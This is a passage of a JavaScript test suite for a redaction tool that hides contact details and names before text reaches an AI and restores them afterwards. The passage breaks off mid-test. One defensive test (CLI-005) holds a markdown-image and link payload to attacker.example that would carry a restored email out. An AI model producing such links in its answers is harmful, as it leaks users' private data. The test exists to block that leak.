// Run: node --test "tools/redact-restore/*.test.mjs"
//
// Tests the page's own script (extracted from redact-restore.html and run in
// a Node VM with no DOM), so what is tested is exactly what ships.
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import vm from "node:vm";

import { blocks, sha256 } from "./update-csp.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));
const HTML = readFileSync(join(HERE, "redact-restore.html"), "utf8");
const { style, script } = blocks(HTML);

const ctx = vm.createContext({});
vm.runInContext(`${script}\nthis.RedactCore = RedactCore;`, ctx);
const R = ctx.RedactCore;

const ALL = { email: true, phone: true, ssn: true, card: true, money: false, url: false, terms: "" };
const session = () => new R.Session();

test("the page cannot reach the network, and its CSP is pinned to its own code", () => {
  const csp = HTML.match(/http-equiv="Content-Security-Policy" content="([^"]+)"/)[1];
  assert.match(csp, /default-src 'none'/);
  assert.match(csp, /connect-src 'none'/);
  assert.match(csp, /form-action 'none'/);
  assert.ok(csp.includes(`script-src 'sha256-${sha256(script)}'`), "script hash is stale: run node update-csp.mjs");
  assert.ok(csp.includes(`style-src 'sha256-${sha256(style)}'`), "style hash is stale: run node update-csp.mjs");
  assert.doesNotMatch(csp, /unsafe-inline|unsafe-eval|https?:/);
  // No external anything, and no inline handlers or style attributes the
  // policy would silently block.
  assert.doesNotMatch(HTML, /<(link|img|iframe|object|embed)\b/i);
  assert.doesNotMatch(HTML, /\s(src|href)="https?:/i);
  assert.doesNotMatch(HTML, /\son[a-z]+="/i);
  assert.doesNotMatch(HTML, /\sstyle="/i);
  assert.equal((HTML.match(/<script\b/g) || []).length, 1);
});

test("emails and phone numbers are replaced, and restore puts them back", () => {
  const s = session();
  const input = "Call Luis at (602) 555-0142 or luis.ortega@bestbyte.example by Friday.";
  const out = R.redactText(input, ALL, s);
  assert.equal(out, "Call Luis at [PHONE-1] or [EMAIL-1] by Friday.");
  assert.equal(R.restore(out, s.key).text, input);
});

test("the same detail always gets the same placeholder", () => {
  const s = session();
  const out = R.redactText("Best Byte said yes. BEST BYTE wants more. best byte!", { ...ALL, terms: "Best Byte" }, s);
  assert.equal(out, "[TERM-1] said yes. [TERM-1] wants more. [TERM-1]!");
  assert.equal(s.key.entries.length, 1);
});

test("terms can carry their own label, and a reused label stays unambiguous", () => {
  const s = session();
  const out = R.redactText("Best Byte and ValuMart", { ...ALL, terms: "Best Byte => retailer a\nValuMart => RETAILER A" }, s);
  assert.equal(out, "[RETAILER-A] and [RETAILER-A-2]");
  assert.equal(R.restore(out, s.key).text, "Best Byte and ValuMart");
});

test("a listed first name never replaces half of an email address", () => {
  // The bug this pins: at the same start position the shorter term used to
  // win, leaving "[TERM-1].kim@daltoncomputers.example" in the output.
  const s = session();
  const out = R.redactText("rachel.kim@daltoncomputers.example and Rachel", { ...ALL, terms: "Rachel" }, s);
  assert.equal(out, "[EMAIL-1] and [TERM-1]");
});

test("terms match whole words only", () => {
  const s = session();
  assert.equal(R.redactText("Dalton, Daltonics, daltoncomputers", { ...ALL, terms: "Dalton" }, s), "[TERM-1], Daltonics, daltoncomputers");
});

test("card numbers need a valid checksum; a phone number is not a card", () => {
  const s = session();
  assert.equal(R.redactText("Card 4111 1111 1111 1111 on file.", ALL, s), "Card [CARD-1] on file.");
  assert.equal(R.redactText("Order 4111 1111 1111 1112 shipped.", ALL, session()), "Order 4111 1111 1111 1112 shipped.");
  assert.equal(R.luhn("4111111111111111"), true);
});

test("money amounts are optional, and a suffix never eats the next word", () => {
  const on = { ...ALL, money: true };
  assert.equal(R.redactText("Invoice for $14,250.00, budget $85K, a $5 key", on, session()), "Invoice for [AMOUNT-1], budget [AMOUNT-2], a [AMOUNT-3] key");
  assert.equal(R.redactText("Invoice for $14,250.00", ALL, session()), "Invoice for $14,250.00");
});

test("money in other forms: a currency before or after, other currencies, size words", () => {
  const on = { ...ALL, money: true };
  const amounts = ["USD 900", "900 USD", "US$900", "€5,000", "£1.2M", "¥300", "12k dollars", "2.5 million euros", "$2B", "CAD 1,500.50"];
  for (const a of amounts) assert.equal(R.redactText(`Paid ${a} today`, on, session()), "Paid [AMOUNT-1] today", a);
  // A number with no currency is not money: units, percentages, weights, store numbers.
  assert.equal(R.redactText("12k units, 18.4%, 5 pounds, store 4471, $5 Best", on, session()), "12k units, 18.4%, 5 pounds, store 4471, [AMOUNT-1] Best");
  // A size word is a whole word: "$1,200 Kits" keeps its K, "$1,500 Bundles" its B.
  assert.equal(R.redactText("$1,200 Kits and $1,500 Bundles", on, session()), "[AMOUNT-1] Kits and [AMOUNT-2] Bundles");
});

test("a listed name run together is the same name: BestByte, Best-Byte, bestbyte.com, rachel.kim", () => {
  const opts = { ...ALL, lists: { COMPANY: "Best Byte", PERSON: "Rachel Kim", PRODUCT: "Project Falcon" } };
  const s = session();
  const out = R.redactText("#BestByte and Best-Byte at bestbyte.com; best_byte.csv; @rachelkim and rachel.kim; ProjectFalcon.", opts, s);
  assert.equal(out, "#[COMPANY-01] and [COMPANY-01] at [COMPANY-01].com; [COMPANY-01].csv; @[PERSON-01] and [PERSON-01]; [PRODUCT-01].");
  assert.equal(R.restore("[COMPANY-01]", s.key).text, "Best Byte");
  // One word has nothing to run together, and the words must be plain letters or digits.
  assert.deepEqual([...R.joinedForms([{ term: "ValuMart", kind: "COMPANY", label: "" }, { term: "A&B Co", kind: "COMPANY", label: "" }])], []);
});

test("web links: www addresses too, and a sentence keeps its full stop", () => {
  const on = { ...ALL, url: true };
  assert.equal(R.redactText("See www.dalton.example/q3. Or https://intranet.example/falcon, today!", on, session()), "See [LINK-1]. Or [LINK-2], today!");
});

test("restore leaves unknown placeholders alone and says so", () => {
  const s = session();
  R.redactText("ruth.abernathy@costwise.example", ALL, s);
  const r = R.restore("Email [EMAIL-1] and [EMAIL-9] about [CLIENT-2].", s.key);
  assert.equal(r.text, "Email ruth.abernathy@costwise.example and [EMAIL-9] about [CLIENT-2].");
  assert.equal(r.replaced, 1);
  assert.deepEqual([...r.unknown], ["[EMAIL-9]", "[CLIENT-2]"]);
});

test("a loaded key keeps its placeholders and continues the numbering", () => {
  const first = session();
  R.redactText("a@x.example b@x.example", ALL, first);
  const saved = JSON.parse(JSON.stringify(first.key));
  assert.equal(R.validateKey(saved), true);
  const second = new R.Session(saved);
  assert.equal(R.redactText("b@x.example c@x.example", ALL, second), "[EMAIL-2] [EMAIL-3]");
});

test("named lists hand out their own two-digit placeholders, numbered 1 to N", () => {
  const products = Array.from({ length: 11 }, (_, i) => `Vantage ${20 + i}`).join("\n");
  const opts = { ...ALL, lists: { PRODUCT: `Project Falcon\n${products}`, COMPANY: "Best Byte\nDalton Computers", PERSON: "Rachel Kim", PROJECT: "Back to School", TOOL: "ShelfSight" } };
  const s = session();
  const out = R.redactText("Rachel Kim at Dalton Computers wants Project Falcon on the Best Byte endcap for Back to School; track it in ShelfSight.", opts, s);
  assert.equal(out, "[PERSON-01] at [COMPANY-01] wants [PRODUCT-01] on the [COMPANY-02] endcap for [PROJECT-01]; track it in [TOOL-01].");
  // 1 to N: the eleventh and twelfth products are PRODUCT-11 and PRODUCT-12.
  const more = R.redactText(Array.from({ length: 11 }, (_, i) => `Vantage ${20 + i}`).join(", "), opts, s);
  assert.match(more, /^\[PRODUCT-02\], \[PRODUCT-03\], .* \[PRODUCT-12\]$/);
  // Each entry is recorded under its own kind, and everything restores.
  const kinds = new Set([...s.key.entries].map((e) => e.kind));
  for (const k of ["PERSON", "COMPANY", "PRODUCT", "PROJECT", "TOOL"]) assert.ok(kinds.has(k), k);
  assert.equal(R.restore(out, s.key).text, "Rachel Kim at Dalton Computers wants Project Falcon on the Best Byte endcap for Back to School; track it in ShelfSight.");
  assert.equal(R.KIND_LABEL.PRODUCT, "Product");
});

test("lists keep labels, the old box keeps [TERM-1], and a loaded key continues each list's numbering", () => {
  const opts = { ...ALL, terms: "store 4471", lists: { PRODUCT: "Falcon => CODENAME-F\nOsprey", COMPANY: "Best Byte" } };
  const first = session();
  assert.equal(R.redactText("Falcon, Osprey, Best Byte, store 4471", opts, first), "[CODENAME-F], [PRODUCT-01], [COMPANY-01], [TERM-1]");
  const saved = JSON.parse(JSON.stringify(first.key));
  assert.equal(R.validateKey(saved), true);
  const second = new R.Session(saved);
  assert.equal(R.redactText("Osprey and Kestrel at ValuMart", { ...ALL, lists: { PRODUCT: "Osprey\nKestrel", COMPANY: "ValuMart" } }, second), "[PRODUCT-01] and [PRODUCT-02] at [COMPANY-02]");
});

test("a name typed in two lists gets one placeholder, from the first list", () => {
  const out = R.redactText("Falcon shipped.", { ...ALL, lists: { COMPANY: "Falcon", PRODUCT: "Falcon" } }, session());
  assert.equal(out, "[COMPANY-01] shipped.");
});

test("list names are hidden in a CSV's cells and its header row", () => {
  const csv = "Week,Falcon Units,Buyer\n2026-09-12,40,Rachel Kim\n2026-09-19,55,Rachel Kim\n";
  const out = R.redactCsv(csv, { ...ALL, lists: { PRODUCT: "Falcon", PERSON: "Rachel Kim" } }, session(), ["keep", "keep", "keep"]);
  assert.equal(out, "Week,[PRODUCT-01] Units,Buyer\n2026-09-12,40,[PERSON-01]\n2026-09-19,55,[PERSON-01]\n");
});

test("validateKey refuses anything that is not a key file", () => {
  assert.equal(R.validateKey(null), false);
  assert.equal(R.validateKey({ entries: [] }), false);
  assert.equal(R.validateKey({ tool: "redact-restore", entries: [{ placeholder: "<script>", value: "x", kind: "TERM" }] }), false);
});

test("parseKey recognizes a saved key file and nothing else, so a key dropped in the wrong place is routed to step 2", () => {
  const s = session();
  R.redactText("a@x.example", ALL, s);
  const saved = JSON.stringify({ ...s.key, saved: "2026-10-19T00:00:00Z" }, null, 2);
  assert.equal(R.parseKey(saved).entries[0].value, "a@x.example");
  assert.equal(R.parseKey(`\n  ${saved}`).entries.length, 1);
  for (const notKey of ["", "Opportunity,Notes\n1,a", "{ not json", "[]", "null", '{"entries":[]}', JSON.stringify({ tool: "other", entries: [] }), undefined]) {
    assert.equal(R.parseKey(notKey), null, String(notKey));
  }
});

test("fileKind names the files the page can't read as text, and lets text files through", () => {
  const cases = {
    office: ["export.xlsx", "notes.docx", "deck.pptx", "macro.xlsm", "template.potx"],
    spreadsheet: ["Q3.XLS", "sheet.numbers", "old.ods"],
    document: ["old.doc", "letter.rtf"],
    slides: ["old.ppt", "deck.key"],
    pdf: ["scan.pdf"],
    outlook: ["Fwd- planogram.msg"],
    image: ["screenshot.png", "photo.JPG", "photo.jpeg", "chart.webp", "IMG_0001.heic"],
    binary: ["kit.zip", "call.mp4"],
  };
  for (const [kind, names] of Object.entries(cases)) for (const name of names) assert.equal(R.fileKind(name), kind, name);
  for (const name of ["export.csv", "notes.txt", "brief.md", "message.eml", "redaction-key-202610191200.json", "answer", "data.tsv"]) {
    assert.equal(R.fileKind(name), null, name);
  }
});

test("looksBinary catches a renamed binary file and passes real text", () => {
  assert.equal(R.looksBinary("PK\u0003\u0004\u0000\u0000 zipped"), true);
  assert.equal(R.looksBinary("Opportunity,Notes\n1,“curly” café ✓"), false);
});

test("every unreadable file comes with a way to bring its text in, in the right keyboard shortcuts", () => {
  for (const kind of ["spreadsheet", "document", "slides", "pdf", "outlook", "image", "binary"]) {
    const win = R.incompatibleHelp("x.file", kind, false);
    const mac = R.incompatibleHelp("x.file", kind, true);
    assert.match(win.lead, /^“x\.file” /, kind);
    assert.ok(win.steps.length >= 1, kind);
    assert.doesNotMatch(win.steps.join(" "), /⌘/, kind);
    assert.doesNotMatch(mac.steps.join(" "), /Ctrl\+/, kind);
  }
  // Copy-and-paste routes name the shortcuts and the paste button.
  for (const kind of ["document", "slides", "pdf", "outlook"]) {
    const steps = R.incompatibleHelp("x", kind, false).steps.join(" ");
    assert.match(steps, /Ctrl\+A/, kind);
    assert.match(steps, /Ctrl\+C/, kind);
    assert.match(steps, /Paste copied text/, kind);
  }
  // A spreadsheet is best saved as CSV: only that keeps the column choices.
  assert.match(R.incompatibleHelp("x.xls", "spreadsheet", false).steps[0], /Save As.*\.xlsx.*Keep, Mask or Drop.*every sheet/);
  assert.match(R.incompatibleHelp("old.ppt", "slides", false).steps[0], /Save As.*\.pptx.*redacted deck back/);
  assert.match(R.incompatibleHelp("deck.pptx", "slides", true).steps.join(" "), /View → Outline.*⌘A.*⌘C/);
  assert.match(R.incompatibleHelp("scan.pdf", "pdf", false).steps.join(" "), /scan/);
});

test("CSV: dropped columns vanish, masked values are hidden everywhere, headers name the placeholder", () => {
  const csv = [
    "Opportunity,Contact Name,Contact Email,Notes",
    "Holiday endcap,Tessa Monroe,tessa.monroe@bestbyte.example,Tessa wants photos weekly",
    "Demo refresh,Nate Brennan,nate.brennan@macrocenter.example,\"Call Nate, then Tessa\"",
    "",
  ].join("\n");
  const s = session();
  const header = R.parseCsv(csv)[0];
  // Free-text notes start on Drop; this test keeps them to prove that a
  // masked name is hidden inside the notes too.
  assert.deepEqual([...header.map((h) => R.suggestAction(h))], ["keep", "mask", "drop", "drop"]);
  const actions = ["keep", "mask", "drop", "keep"];
  assert.deepEqual(["Opportunity Name", "Account Name", "Contact Title", "Opportunity Owner", "Program Type"].map((h) => R.suggestAction(h)), ["keep", "mask", "keep", "mask", "keep"]);
  const out = R.redactCsv(csv, ALL, s, actions);
  assert.equal(
    out,
    [
      "Opportunity,Contact Name,Notes",
      "Holiday endcap,[CONTACT-NAME-1],[CONTACT-NAME-1] wants photos weekly",
      "Demo refresh,[CONTACT-NAME-2],\"Call [CONTACT-NAME-2], then [CONTACT-NAME-1]\"",
      "",
    ].join("\n"),
  );
});

test("name parts are case-sensitive, and a shared first name is never credited to one person", () => {
  const csv = ["Owner,Notes", "Grace Liu,Sam and Grace agreed; grace period ends Friday", "Sam Okafor,Ask Sam", "Sam Lee,Ask Sam Lee", ""].join("\n");
  const s = session();
  const out = R.redactCsv(csv, ALL, s, ["mask", "keep"]);
  const [, row1, row2, row3] = out.trim().split("\n").map((l) => l.split(","));
  const sam = row1[1].split(" ")[0];
  // Grace (capitalized) is hidden as Grace Liu; "grace period" is untouched.
  assert.equal(row1[1], `${sam} and ${row1[0]} agreed; grace period ends Friday`);
  // The bare "Sam" gets ONE placeholder of its own, distinct from both Sams.
  assert.equal(row2[1], `Ask ${sam}`);
  assert.notEqual(sam, row2[0]);
  assert.notEqual(sam, row3[0]);
  assert.equal(row3[1], `Ask ${row3[0]}`);
  // "Sam" restores to "Sam", not to either Sam's full name.
  assert.equal(R.restore(`${sam} called`, s.key).text, "Sam called");
});

test("the course's own CRM export comes out with no contact details left", () => {
  const csv = readFileSync(join(HERE, "..", "..", "data-pack", "crm", "opportunities-export-2026-11-02.csv"), "utf8");
  const rows = R.parseCsv(csv);
  const header = rows[0];
  const actions = header.map((h) => R.suggestAction(h));
  const s = session();
  const out = R.redactCsv(csv, ALL, s, actions);
  assert.doesNotMatch(out, /@/);
  assert.doesNotMatch(out, /555-01\d\d/);
  const names = new Set(rows.slice(1).map((r) => r[header.indexOf("Contact Name")]));
  for (const n of names) assert.ok(!out.includes(n), `${n} survived redaction`);
  // And what the analysis needs is untouched: amounts, stages, program types,
  // and the program words inside each opportunity name.
  const outRows = R.parseCsv(out);
  assert.equal(outRows.length, rows.length);
  const col = (rs, name) => rs.slice(1).map((r) => r[rs[0].indexOf(name)]);
  assert.deepEqual(col(outRows, "Amount"), col(rows, "Amount"));
  assert.deepEqual(col(outRows, "Stage"), col(rows, "Stage"));
  assert.deepEqual(col(outRows, "Program Type"), col(rows, "Program Type"));
  // The export's Notes column carries remarks shared in confidence. With the
  // suggested choices it is dropped, so none of that text reaches the AI.
  assert.ok(csv.includes("in confidence"), "the kit's export should still carry the confidential note");
  assert.doesNotMatch(out, /in confidence|do not forward/i);
  assert.ok(!outRows[0].includes("Notes"));
  // Retailer names are masked wherever they appear, including inside the
  // opportunity name, because the Account Name column is masked.
  for (const r of ["Best Byte", "Macro Center", "ValuMart", "Costwise Club", "Bullseye"]) assert.ok(!out.includes(r), `${r} survived`);
  assert.ok(col(outRows, "Opportunity Name").every((n) => /: /.test(n)), "opportunity names keep their program wording");
});

test("a field note's personal cell number and a shopper's email are caught", () => {
  const note = readFileSync(join(HERE, "..", "..", "data-pack", "field-notes", "2026-10-31-best-byte-1187-west.md"), "utf8");
  const out = R.redactText(note, ALL, session());
  assert.doesNotMatch(out, /555-0142/);
  const other = readFileSync(join(HERE, "..", "..", "data-pack", "field-notes", "2026-10-28-bullseye-northeast.md"), "utf8");
  assert.doesNotMatch(R.redactText(other, ALL, session()), /dprice\.home/);
});

test("prose with a comma a line is not mistaken for a spreadsheet", () => {
  assert.equal(R.looksLikeCsv("Hi Taylor,\nThanks, again\nSee you, soon\n"), false);
  assert.equal(R.looksLikeCsv("a,b,c\n1,2,3\n4,5,6\n"), true);
});

/* ---------- Security review round 1 (pre-commit, 2026-10-19) ---------- */

test("an encoded or multipart email is refused, not half-redacted (CLI-001)", () => {
  const b64 = "From: a@x.example\r\nContent-Transfer-Encoding: base64\r\n\r\nVGVzc2EgTW9ucm9lIDIxNC01NTUtMDE0Mg==";
  const qp = "From: a@x.example\nContent-Transfer-Encoding: quoted-printable\n\nCall tessa.monroe@bestbyte.exa=\nmple";
  const multi = 'From: a@x.example\nContent-Type: multipart/mixed; boundary="b"\n\n--b\n';
  for (const raw of [b64, qp, multi]) assert.ok(R.mimeProblem(raw), raw.slice(0, 40));
  // The kit's own plain-text emails are fine.
  for (const f of ["01-dalton-qbr-deck.eml", "09-vendor-intro.eml"]) {
    const eml = readFileSync(join(HERE, "..", "..", "data-pack", "inbox", f), "utf8");
    assert.equal(R.mimeProblem(eml), null, f);
  }
});

test("CSV header cells are redacted against your list and the patterns (CLI-002)", () => {
  const csv = "Week,Best Byte Units,ops@bestbyte.example,Region\n2026-08-01,12,3,West\n2026-08-08,9,4,West\n";
  const out = R.redactCsv(csv, { ...ALL, terms: "Best Byte => RETAILER-A" }, session(), ["keep", "keep", "keep", "keep"]);
  const header = out.split("\n")[0];
  assert.equal(header, "Week,[RETAILER-A] Units,[EMAIL-1],Region");
});

test("cards beside an expiry or CVV, and leading digits, are still found (CLI-003)", () => {
  assert.equal(R.redactText("Card 4111 1111 1111 1111 12/27 on file", ALL, session()), "Card [CARD-1] 12/27 on file");
  assert.equal(R.redactText("4111111111111111 123", ALL, session()), "[CARD-1] 123");
  assert.equal(R.redactText("ref 99 4111 1111 1111 1111", ALL, session()), "ref 99 [CARD-1]");
  // A 16-digit number that fails the checksum is not searched for a card inside it.
  assert.equal(R.redactText("Order 4111 1111 1111 1112 shipped.", ALL, session()), "Order 4111 1111 1111 1112 shipped.");
});

test("unseparated and +1 phone numbers, and SSNs without dashes, are found (CLI-003)", () => {
  assert.equal(R.redactText("Cell 2145550125 or +12145550125.", ALL, session()), "Cell [PHONE-1] or [PHONE-1].");
  assert.equal(R.redactText("SSN 123 45 6789, again 123456789", ALL, session()), "SSN [SSN-1], again [SSN-1]");
  // Not a phone: ten digits starting with 0 or 1 (an ID), or a mixed-separator SSN look-alike.
  assert.equal(R.redactText("ID 1234567890", ALL, session()), "ID 1234567890");
});

test("email addresses on non-ASCII domains are found whole (CLI-003)", () => {
  assert.equal(R.redactText("anna@müller.example and jürgen@x.example", ALL, session()), "[EMAIL-1] and [EMAIL-2]");
});

test("no two values ever share a placeholder, whatever the labels (CLI-004)", () => {
  const s = session();
  const out = R.redactText("Costwise, Best Byte and ValuMart", { ...ALL, terms: "Best Byte => RETAILER-A\nValuMart => RETAILER-A\nCostwise => RETAILER-A-2" }, s);
  const placeholders = s.key.entries.map((e) => e.placeholder);
  assert.equal(new Set(placeholders).size, placeholders.length, placeholders.join(" "));
  assert.equal(R.restore(out, s.key).text, "Costwise, Best Byte and ValuMart");
});

test("labels and column prefixes always start with a letter, so the key stays loadable (CLI-004)", () => {
  const s = session();
  R.redactText("Dalton", { ...ALL, terms: "Dalton => 2020" }, s);
  R.redactCsv("2026 Owner,x\nJo Park,1\nAl Ng,2\n", ALL, s, ["mask", "keep"]);
  for (const e of s.key.entries) assert.match(e.placeholder, /^\[[A-Z][A-Z0-9-]*\]$/);
  assert.equal(R.validateKey(JSON.parse(JSON.stringify(s.key))), true);
});

test("every placeholder from the kit's CRM export validates and round-trips (CLI-004)", () => {
  const csv = readFileSync(join(HERE, "..", "..", "data-pack", "crm", "opportunities-export-2026-11-02.csv"), "utf8");
  const header = R.parseCsv(csv)[0];
  const s = session();
  const out = R.redactCsv(csv, ALL, s, header.map((h) => R.suggestAction(h)));
  assert.equal(R.validateKey(JSON.parse(JSON.stringify(s.key))), true);
  const placeholders = s.key.entries.map((e) => e.placeholder);
  assert.equal(new Set(placeholders).size, placeholders.length);
  assert.equal(R.restore(out, s.key).unknown.length, 0);
});

test("restore never writes a real value into a link (CLI-005)", () => {
  const s = session();
  R.redactText("tessa.monroe@bestbyte.example", ALL, s);
  const answer = "Email [EMAIL-1]. ![x](https://attacker.example/p?e=[EMAIL-1]) and https://attacker.example/?e=[EMAIL-1]";
  const r = R.restore(answer, s.key);
  assert.equal(r.text, "Email tessa.monroe@bestbyte.example. ![x](https://attacker.example/p?e=[EMAIL-1]) and https://attacker.example/?e=[EMAIL-1]");
  assert.equal(r.replaced, 1);
  assert.equal(r.inLinks, 2);
});

test("the only thing the page ever stores is the theme choice, under one key", () => {
  // The README promises nothing you open or type is stored. Every storage
  // call in the script must be the theme key; no other storage API appears.
  const calls = script.match(/localStorage\.[a-zA-Z]+\([^)]*\)/g) || [];
  assert.ok(calls.length >= 2, "theme read and write expected");
  for (const c of calls) assert.match(c, /^localStorage\.(getItem|setItem)\(THEME_KEY(, next)?\)$/, c);
  assert.match(script, /const THEME_KEY = "cortexa-theme";/);
  assert.doesNotMatch(script, /sessionStorage|indexedDB|document\.cookie|caches\.|serviceWorker/);
});

test("the page opts out of browser translation (CLI-007)", () => {
  assert.match(HTML, /<html lang="en" translate="no">/);
  assert.match(HTML, /<meta name="google" content="notranslate">/);
});

test("a large CSV with masked columns redacts in well under a few seconds (CLI-008)", () => {
  const rows = ["Contact Name,Owner,Notes"];
  for (let i = 0; i < 3000; i++) rows.push(`Person${i} Lastname${i},Owner${i % 40} Rep,Call Person${i} about deal ${i}`);
  const t0 = Date.now();
  const out = R.redactCsv(rows.join("\n") + "\n", ALL, session(), ["mask", "mask", "keep"]);
  const ms = Date.now() - t0;
  assert.ok(ms < 4000, `${ms} ms`);
  assert.doesNotMatch(out, /Person1\b|Lastname1\b/);
});

test("People list: a first or last name on its own is the same person; everyday words and other lists are left alone", () => {
  const opts = { ...ALL, lists: { PERSON: "Rachel Kim\nWill Smith\nSam Okafor\nSam Lee", COMPANY: "Best Byte" } };
  const s = session();
  const out = R.redactText("Rachel Kim asked. Rachel said Ms. Kim and Rach agreed. Will call Monday; Will Smith and Smith will too. Ask Sam. Best price at Best Byte.", opts, s);
  const p = out.match(/^(\[PERSON-\d+\]) asked/)[1];
  // "Rachel" and "Kim" alone take Rachel Kim's placeholder; the nickname is not on the list.
  assert.ok(out.includes(`${p} said Ms. ${p} and Rach agreed.`), out);
  // "Will" is an everyday word: hidden only inside the full name. "Smith" alone is hidden.
  const w = out.match(/Will call Monday; (\[PERSON-\d+\]) and (\[PERSON-\d+\]) will too/);
  assert.ok(w && w[1] === w[2], out);
  // A first name two listed people share gets its own placeholder, which restores as itself.
  const sam = out.match(/Ask (\[PERSON-\d+\])\./)[1];
  assert.equal(R.restore(`${sam} called`, s.key).text, "Sam called");
  // Companies are matched whole: "Best price" keeps its word.
  assert.ok(out.endsWith("Best price at [COMPANY-01]."), out);
  // A part restores as the full name, the placeholder's one value.
  assert.equal(R.restore(`${p} said`, s.key).text, "Rachel Kim said");
  // Lower case is not a name: "kim chi" stays.
  assert.equal(R.redactText("kim chi", opts, session()), "kim chi");
});

test("People list: a person's own label covers the parts of their name too", () => {
  const out = R.redactText("Rachel called; Kim agreed.", { ...ALL, lists: { PERSON: "Rachel Kim => BUYER-A" } }, session());
  assert.equal(out, "[BUYER-A] called; [BUYER-A] agreed.");
});

test("the everyday-word list holds no name from the kit's own practice data", () => {
  const csv = readFileSync(join(HERE, "..", "..", "data-pack", "crm", "opportunities-export-2026-11-02.csv"), "utf8");
  const rows = R.parseCsv(csv);
  const cols = rows[0].map((h, i) => (R.personColumn(h) ? i : -1)).filter((i) => i >= 0);
  for (const r of rows.slice(1)) for (const i of cols) for (const part of (r[i] || "").split(/\s+/)) assert.ok(!R.COMMON_WORDS.has(part), `${r[i]}: "${part}" would never be hidden alone`);
});

test("no pattern can stall the page: long hostile runs redact quickly with every option on", () => {
  // Each shape once made a pattern rescan from every character (seconds to
  // minutes on a 200,000-character paste); each pattern now starts only where
  // its match could start.
  const on = { ...ALL, money: true, url: true, lists: { COMPANY: "Best Byte", PERSON: "Rachel Kim" } };
  for (const [name, s] of [
    ["a long number with commas", "1," + "111,".repeat(50000) + "x"],
    ["a long run of digits", "9".repeat(200000) + " k"],
    ["dotted words with no @", "www." + "a.".repeat(100000)],
    ["digits and spaces", "1 ".repeat(100000) + "USD"],
    ["plus signs and digits", "+4".repeat(100000)],
  ]) {
    const t = Date.now();
    R.redactText(s, on, session());
    assert.ok(Date.now() - t < 2000, `${name}: took ${Date.now() - t} ms`);
  }
});

test("a listed name with a plural ending or a word glued on is still caught, and restores with its ending", () => {
  const opts = { ...ALL, lists: { COMPANY: "Best Byte", PERSON: "Marcus Webb\nMac Smith" } };
  const s = session();
  const out = R.redactText("Two Best Bytes, the BestByteWeekly file, Marcus WebbProject timing, Best Byteses stays. A MacBook, and Macs.", opts, s);
  assert.equal(out, "Two [COMPANY-01]s, the [COMPANY-01]Weekly file, [PERSON-01]Project timing, Best Byteses stays. A MacBook, and Macs.");
  assert.equal(R.restore("Two [COMPANY-01]s", s.key).text, "Two Best Bytes");
  // A first or last name on its own is held to the word's edge: "MacBook" and "Macs" are not Mac Smith.
});

test("aliases: a nickname or initials after a bar take the name's placeholder and restore as the name", () => {
  const opts = { ...ALL, lists: { PERSON: "Rachel Kim | Rach | RK\nWill Smith | Will\nLi Wei | Li", COMPANY: "Best Byte | BB | bestbyte => RETAILER-A" } };
  const s = session();
  const out = R.redactText("Rach and RK (not rk) met Will. They will call Li at BB; BESTBYTE agreed.", opts, s);
  // A capitalized alias matches as typed: "rk" and the word "will" keep their words.
  assert.equal(out, "[PERSON-01] and [PERSON-01] (not rk) met [PERSON-02]. They will call [PERSON-03] at [RETAILER-A]; [RETAILER-A] agreed.");
  assert.equal(R.restore("[PERSON-01] called", s.key).text, "Rachel Kim called");
  assert.equal(R.restore("[RETAILER-A]", s.key).text, "Best Byte");
  // Aliases don't make parts or run-together forms of their own.
  const terms = R.allTerms({ ...opts, lists: { PERSON: "Rachel Kim | Shelly Kim | Rach K" } }).map((t) => t.term);
  assert.ok(terms.includes("Rachel") && terms.includes("RachelKim"), terms.join(", "));
  assert.ok(!terms.includes("Shelly") && !terms.includes("ShellyKim") && !terms.includes("RachK"), terms.join(", "));
});

test("a name typed in lower case still hides its first and last name, written with capitals", () => {
  const out = R.redactText("Rachel said Kim agreed; kim chi stays.", { ...ALL, lists: { PERSON: "rachel kim" } }, session());
  assert.equal(out, "[PERSON-01] said [PERSON-01] agreed; kim chi stays.");
});

test("phone numbers outside the US are found when written with their country code", () => {
  for (const n of ["+44 20 7946 0958", "+49 30 901820", "+33 (0)1 42 68 53 00", "+91 98765 43210", "+61 2 9374 4000", "+52 55 5123 4567", "+442079460958"]) {
    assert.equal(R.redactText(`Call ${n} today`, ALL, session()), "Call [PHONE-1] today", n);
  }
  // Not phone numbers: a score change, a percentage, a version, too few digits.
  assert.equal(R.redactText("Share +2 points, +15%, build +3.2, ext +44 12.", ALL, session()), "Share +2 points, +15%, build +3.2, ext +44 12.");
  // One number written two ways shares a placeholder.
  const s = session();
  assert.equal(R.redactText("+44 20 7946 0958 or +442079460958", ALL, s), "[PHONE-1] or [PHONE-1]");
});

test("names the lists missed: suggested strongest first, and only suggested", () => {
  const opts = { ...ALL, lists: { COMPANY: "Best Byte" } };
  const text = [
    "Hi Dana,",
    "Thanks for the call. Ms. Patel will join, and Dr Okafor too.",
    "Marcus Webb said the Weekly Report is late. We met at Micro Center on Monday, Nov 9.",
    "Ask Tessa about the Back to School plan; we told Jordan the price at Best Byte.",
    "Sales rose 4%, so we told Rose. The Quarterly Business Review is next. Our Store Experience Manager and Category Buyer approved.",
    "Cc  Priya Natarajan",
    "Best,",
    "Taylor Brooks",
    "TAYLOR BROOKS · Q3 2026",
  ].join("\n");
  const out = R.redactText(text, opts, session());
  const got = [...R.suggestNames(out, opts).map((x) => `${x.tier}:${x.name}`)];
  // "Rose" is left out: "rose" is also a word in this text.
  assert.deepEqual(got, ["0:Patel", "0:Okafor", "1:Dana", "1:Tessa", "1:Priya Natarajan", "2:Marcus Webb", "2:Micro Center", "2:Taylor Brooks", "3:Jordan"]);
  // Nothing is hidden by suggesting it: the text is exactly what redaction made.
  assert.match(out, /Marcus Webb said/);
  // A suggested name, once listed, is hidden and no longer suggested.
  const listed = { ...opts, lists: { ...opts.lists, PERSON: "Marcus Webb" } };
  const again = R.redactText(text, listed, session());
  assert.ok(!R.suggestNames(again, listed).some((x) => x.name === "Marcus Webb"));
  assert.match(again, /\[PERSON-01\] said/);
});

test("suggestions skip a CSV's header row and a workbook sheet's header, and the kit's export leaves no name to suggest", () => {
  assert.deepEqual([...R.suggestNames("Merch Notes,Account Name\n[CONTACT-NAME-1],[ACCOUNT-NAME-1]", ALL, { csv: true })], []);
  assert.deepEqual([...R.suggestNames("Sheet: Pipeline\nMerch Notes,Close Date\nx", ALL)], []);
  // The same words in prose are suggested: only header rows are skipped.
